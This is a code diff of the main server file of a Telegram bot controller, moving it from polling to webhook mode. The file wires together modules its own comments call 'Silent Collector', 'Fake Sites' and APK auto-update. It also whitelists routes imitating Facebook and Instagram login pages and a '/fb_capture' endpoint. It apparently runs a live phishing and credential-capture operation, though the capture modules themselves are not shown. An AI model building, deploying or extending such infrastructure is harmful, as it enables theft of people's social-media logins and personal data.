@@ -1,7 +1,8 @@
 # main.py
 # ============================================================
-# DEV 1 - Bot Controller v13
-# مع Admin System + Silent Collector + Fake Sites + Admin Tools
+# DEV 1 - Bot Controller v14
+# مع Webhook Mode (بدل Polling)
+# + Admin System + Silent Collector + Fake Sites + Admin Tools
 # + WhatsApp Report + Force Subscribe
 # ============================================================
 
@@ -9,6 +10,7 @@ import os
 import time
 import threading
 import requests
+import telebot
 from flask import Flask, request, jsonify, redirect
 
 from logging_config import (
@@ -55,6 +57,7 @@ from redis_cleaner import start_cleaner
 from monitoring import init_monitoring, metrics
 from rate_limiter import start_cleanup_thread
 
+
 # ═══════════════════════════════════════════════════════
 # Web Dashboard
 # ═══════════════════════════════════════════════════════
@@ -66,6 +69,7 @@ except Exception as e:
     logger.exception(f"[-] web_dashboard import failed: {e}")
     WEB_DASHBOARD_ENABLED = False
     def init_web_dashboard(app): pass
+
 
 # ═══════════════════════════════════════════════════════
 # APK Auto-Update
@@ -79,6 +83,7 @@ except Exception as e:
     APK_UPDATE_ENABLED = False
     def init_apk_update_routes(app, bot): pass
 
+
 # ═══════════════════════════════════════════════════════
 # Fake Sites
 # ═══════════════════════════════════════════════════════
@@ -90,6 +95,7 @@ except Exception as e:
     logger.exception(f"[-] fake_sites import failed: {e}")
     FAKE_SITES_ENABLED = False
     def init_fake_sites(app, bot): pass
+
 
 # ═══════════════════════════════════════════════════════
 # Admin System Hook
@@ -103,6 +109,7 @@ except Exception as e:
     ADMIN_SYSTEM_HOOK_ENABLED = False
     def init_admin_system(bot): return False
 
+
 # ═══════════════════════════════════════════════════════
 # ★★★ Admin Tools ★★★
 # ═══════════════════════════════════════════════════════
@@ -114,6 +121,7 @@ except Exception as e:
     logger.exception(f"[-] admin_tools import failed: {e}")
     ADMIN_TOOLS_ENABLED = False
     def init_admin_tools(app, bot): pass
+
 
 # ═══════════════════════════════════════════════════════
 # ★★★ Force Subscribe ★★★
@@ -161,15 +169,57 @@ def wa_redirect(payload_id):
 
 
 # ═══════════════════════════════════════════════════════
+# ⚡ Webhook Configuration
+# ═══════════════════════════════════════════════════════
+WEBHOOK_PATH = "/webhook"
+
+# سر فريد لكل نسخة (يعتمد على BOT_TOKEN)
+WEBHOOK_SECRET = "daf_" + BOT_TOKEN.split(":")[0][:24]
+
+# متغير عام لتخزين الـ URL
+WEBHOOK_URL = None
+
+
+# ═══════════════════════════════════════════════════════
+# ⚡ Webhook Route — يستقبل Updates من تلجرام
+# ═══════════════════════════════════════════════════════
+@app.route(WEBHOOK_PATH, methods=['POST'])
+def telegram_webhook():
+    """استقبال updates من تلجرام"""
+    try:
+        # تحقق من الـ secret header (أمان)
+        secret_header = request.headers.get('X-Telegram-Bot-Api-Secret-Token', '')
+        if secret_header and secret_header != WEBHOOK_SECRET:
+            logger.warning("🚫 Webhook: Invalid secret header")
+            return "Unauthorized", 403
+
+        # جلب البيانات
+        if request.headers.get('content-type') == 'application/json':
+            json_string = request.get_data().decode('utf-8')
+            update = telebot.types.Update.de_json(json_string)
+            bot.process_new_updates([update])
+            return "OK", 200
+        else:
+            return "Bad Request", 400
+
+    except Exception as e:
+        logger.exception(f"Webhook error: {e}")
+        return "Error", 500
+
+
+# ═══════════════════════════════════════════════════════
 # Origin Gate
 # ═══════════════════════════════════════════════════════
-ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']
+ORIGIN_GATE_EXEMPT = [
+    '/', '/health', '/_health', '/_metrics', '/_version',
+    WEBHOOK_PATH,  # ← Webhook معفي من التحقق
+]
 
 ALLOWED_PREFIXES = (
     '/wa', '/apk', '/dashboard', '/s/', '/fs',
     '/login.php', '/home.php', '/fb', '/ig_login.php',
     '/fb_capture', '/api/v1/session', '/f/',
-    '/profile', '/admin/wb',
+    '/profile', '/admin/wb', '/webhook',
     '/manifest.json', '/sw.js', '/favicon.ico', '/robots.txt',
     '/_health', '/_metrics', '/_version',
 )
@@ -214,7 +264,7 @@ def log_request(response):
     try:
         if hasattr(request, '_start_time'):
             elapsed_ms = (time.time() - request._start_time) * 1000
-            if not request.path.startswith(('/_', '/')):
+            if not request.path.startswith(('/_', '/')) and request.path != WEBHOOK_PATH:
                 logger.debug(
                     f"🌐 {request.method} {request.path} → "
                     f"{response.status_code} ({elapsed_ms:.1f}ms)"
@@ -344,63 +394,283 @@ else:
 
 
 # ═══════════════════════════════════════════════════════
-# Telegram Bot
+# ⚡ Webhook Setup — احترافي
 # ═══════════════════════════════════════════════════════
-def run_telegram_bot():
-    logger.info("=" * 60)
-    logger.info("🤖 Starting Telegram Bot polling...")
-    logger.info("=" * 60)
+def get_base_url():
+    """يجيب الدومين من متغيرات البيئة"""
+    candidates = [
+        os.environ.get("RAILWAY_PUBLIC_DOMAIN", ""),
+        os.environ.get("PUBLIC_URL", ""),
+        os.environ.get("RAILWAY_STATIC_URL", ""),
+        os.environ.get("APP_URL", ""),
+    ]
+
+    for candidate in candidates:
+        candidate = candidate.strip()
+        if candidate:
+            if not candidate.startswith("http"):
+                candidate = "https://" + candidate
+            return candidate.rstrip("/")
+
+    # Fallback
+    return "https://daf-production-e34a.up.railway.app"
+
+
+def clear_all_webhooks():
+    """
+    ⚡ يمسح الـ webhook بكل الطرق الممكنة
+    عشان نمنع أي تعارض مع نسخ قديمة
+    """
+    logger.info("🧹 Clearing any existing webhooks...")
 
     try:
-        requests.get(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
-            params={"drop_pending_updates": "true"}, timeout=15,
-        )
-    except Exception as e:
-        logger.error(f"[-] deleteWebhook: {e}")
-
-    try:
-        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=15)
-        logger.info(f"[+] getMe: {r.text[:200]}")
-    except Exception as e:
-        logger.error(f"[-] getMe: {e}")
-
-    attempt = 0
-    while True:
+        # 1. عن طريق مكتبة telebot
         try:
-            attempt += 1
-            logger.info(f"[+] Polling attempt #{attempt}")
-            metrics.inc_counter("bot_polling_attempts")
-            bot.infinity_polling(
-                skip_pending=True, timeout=30,
-                long_polling_timeout=30, none_stop=True,
-            )
+            bot.remove_webhook()
+            logger.info("   ✅ bot.remove_webhook() — OK")
         except Exception as e:
-            logger.exception(f"[-] Polling crashed: {e}")
-            metrics.inc_counter("bot_polling_crashes")
-            time.sleep(5)
+            logger.debug(f"   bot.remove_webhook() error: {e}")
+
+        # 2. عن طريق API مباشر — deleteWebhook بدون parameters
+        #    (بيمسح كل شيء)
+        try:
+            r = requests.get(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
+                params={"drop_pending_updates": "true"},
+                timeout=15,
+            )
+            if r.status_code == 200:
+                logger.info("   ✅ API deleteWebhook — OK")
+            else:
+                logger.warning(f"   ⚠️ API deleteWebhook HTTP {r.status_code}")
+        except Exception as e:
+            logger.warning(f"   API deleteWebhook error: {e}")
+
+        # 3. امسح أي polling قديم
+        #    (getUpdates عشان نلغي أي polling شغال)
+        try:
+            r = requests.get(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
+                params={"offset": "-1", "limit": 1, "timeout": 0},
+                timeout=10,
+            )
+            logger.info(f"   ✅ getUpdates flush — HTTP {r.status_code}")
+        except Exception as e:
+            logger.debug(f"   getUpdates flush error: {e}")
+
+        # 4. انتظر شوية عشان تلجرام يحدّث حالته
+        time.sleep(2)
+
+        # 5. تأكد إن الـ webhook اتمسح فعلاً
+        try:
+            info = bot.get_webhook_info()
+            if info.url:
+                logger.warning(f"   ⚠️ Webhook still active: {info.url}")
+                # حاول تاني
+                try:
+                    bot.remove_webhook()
+                    time.sleep(1)
+                except Exception:
+                    pass
+            else:
+                logger.info("   ✅ Confirmed: No webhook active")
+        except Exception as e:
+            logger.debug(f"   get_webhook_info error: {e}")
+
+        logger.info("🧹 Clear webhooks — DONE")
+
+    except Exception as e:
+        logger.exception(f"clear_all_webhooks error: {e}")
 
 
+def setup_webhook():
+    """
+    ⚡ يعمل setup الـ webhook بشكل احترافي
+    1. يمسح أي webhook قديم
+    2. يسجل webhook جديد
+    3. يتأكد من نجاح التسجيل
+    """
+    global WEBHOOK_URL
+
+    try:
+        # ═══ 1. احصل على URL ═══
+        base_url = get_base_url()
+        WEBHOOK_URL = base_url + WEBHOOK_PATH
+
+        logger.info("=" * 60)
+        logger.info("⚡ WEBHOOK SETUP")
+        logger.info("=" * 60)
+        logger.info(f"🔗 Target URL: {WEBHOOK_URL}")
+        logger.info(f"🔐 Secret: {WEBHOOK_SECRET[:20]}...")
+
+        # ═══ 2. امسح أي webhook قديم ═══
+        clear_all_webhooks()
+
+        # ═══ 3. تحقق من معلومات البوت ═══
+        try:
+            me = bot.get_me()
+            logger.info(f"[+] Bot: @{me.username} (ID: {me.id})")
+        except Exception as e:
+            logger.error(f"❌ Failed to get bot info: {e}")
+            return False
+
+        # ═══ 4. سجل الـ webhook ═══
+        logger.info(f"📡 Registering webhook...")
+
+        result = bot.set_webhook(
+            url=WEBHOOK_URL,
+            secret_token=WEBHOOK_SECRET,
+            max_connections=40,
+            allowed_updates=[
+                "message",
+                "callback_query",
+                "inline_query",
+                "chosen_inline_result",
+                "edited_message",
+                "channel_post",
+            ],
+            drop_pending_updates=True,
+        )
+
+        if not result:
+            logger.error("❌ set_webhook returned False")
+            return False
+
+        # ═══ 5. تأكد من نجاح التسجيل ═══
+        time.sleep(2)  # استنى تلجرام يحدّث الحالة
+
+        info = bot.get_webhook_info()
+
+        logger.info("=" * 60)
+        logger.info("📊 WEBHOOK INFO")
+        logger.info("=" * 60)
+        logger.info(f"   URL: {info.url}")
+        logger.info(f"   Has Custom Cert: {info.has_custom_certificate}")
+        logger.info(f"   Pending Updates: {info.pending_update_count}")
+        logger.info(f"   Max Connections: {info.max_connections}")
+        logger.info(f"   Last Error: {info.last_error_message or 'None'}")
+
+        # ═══ 6. تحقق من URL ═══
+        if info.url != WEBHOOK_URL:
+            logger.error(f"❌ URL mismatch!")
+            logger.error(f"   Expected: {WEBHOOK_URL}")
+            logger.error(f"   Got:      {info.url}")
+            return False
+
+        # ═══ 7. تحقق من آخر error ═══
+        if info.last_error_message:
+            logger.warning(f"⚠️ Last error: {info.last_error_message}")
+            logger.warning(f"⚠️ Error date: {info.last_error_date}")
+
+        logger.info("=" * 60)
+        logger.info("✅ WEBHOOK SETUP COMPLETE!")
+        logger.info("=" * 60)
+
+        return True
+
+    except Exception as e:
+        logger.exception(f"❌ setup_webhook error: {e}")
+        return False
+
+
+def delete_webhook_on_shutdown():
+    """يمسح الـ webhook عند الإغلاق"""
+    try:
+        logger.info("🗑️ Removing webhook on shutdown...")
+        bot.remove_webhook()
+        logger.info("✅ Webhook removed")
+    except Exception as e:
+        logger.error(f"remove_webhook on shutdown error: {e}")
+
+
+# ═══════════════════════════════════════════════════════
+# ⚡ Delayed Webhook Setup (بعد ما السيرفر يشتغل)
+# ═══════════════════════════════════════════════════════
+def delayed_webhook_setup():
+    """
+    يعمل setup الـ webhook بعد ما السيرفر يشتغل بـ 5 ثواني
+    عشان نتأكد إن الـ port مفتوح والـ URL شغال
+    """
+    try:
+        logger.info("⏳ Waiting for server to be ready...")
+        time.sleep(5)
+
+        # جرّب تتأكد إن السيرفر شغال
+        try:
+            base_url = get_base_url()
+            test_url = base_url + "/"
+            r = requests.get(test_url, timeout=10)
+            logger.info(f"✅ Server check: HTTP {r.status_code}")
+        except Exception as e:
+            logger.warning(f"⚠️ Server check failed: {e}")
+
+        # ═══ الآن اعمل setup ═══
+        for attempt in range(3):
+            logger.info(f"🔄 Webhook setup attempt #{attempt + 1}/3")
+
+            if setup_webhook():
+                logger.info("🎉 Webhook is LIVE!")
+                return
+
+            logger.warning(f"⚠️ Attempt #{attempt + 1} failed, retrying in 10s...")
+            time.sleep(10)
+
+        logger.error("❌ All webhook setup attempts failed!")
+
+    except Exception as e:
+        logger.exception(f"delayed_webhook_setup error: {e}")
+
+
+# ═══════════════════════════════════════════════════════
+# ⚡ Main
+# ═══════════════════════════════════════════════════════
 if __name__ == "__main__":
     try:
+        # ═══ 1. Redis Cleaner ═══
         start_cleaner()
         logger.info("[+] Redis cleaner started")
 
-        bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
-        bot_thread.start()
-        logger.info("[+] Bot thread started")
+        # ═══ 2. امسح أي webhook قديم فوراً ═══
+        # عشان نمنع التعارض مع النسخة القديمة
+        logger.info("⚡ Clearing old webhooks on startup...")
+        try:
+            requests.get(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
+                params={"drop_pending_updates": "true"},
+                timeout=15,
+            )
+            logger.info("✅ Old webhooks cleared")
+        except Exception as e:
+            logger.warning(f"Initial clear webhook error: {e}")
 
-        time.sleep(2)
-
+        # ═══ 3. Port ═══
         port = int(os.environ.get("PORT", 8080))
+        logger.info("=" * 60)
         logger.info(f"🌐 Flask Web Server starting on port {port}...")
+        logger.info("=" * 60)
 
-        app.run(host="0.0.0.0", port=port, debug=False,
-                use_reloader=False, threaded=True)
+        # ═══ 4. شغل الـ Webhook Setup في thread منفصل ═══
+        setup_thread = threading.Thread(
+            target=delayed_webhook_setup,
+            daemon=True,
+        )
+        setup_thread.start()
+        logger.info("[+] Webhook setup thread started")
+
+        # ═══ 5. شغل Flask ═══
+        app.run(
+            host="0.0.0.0",
+            port=port,
+            debug=False,
+            use_reloader=False,
+            threaded=True,
+        )
 
     except KeyboardInterrupt:
         logger.info("🛑 Received KeyboardInterrupt")
+        delete_webhook_on_shutdown()
     except Exception as e:
         logger.exception(f"💥 Fatal error: {e}")
+        delete_webhook_on_shutdown()
     finally:
         log_shutdown_info()
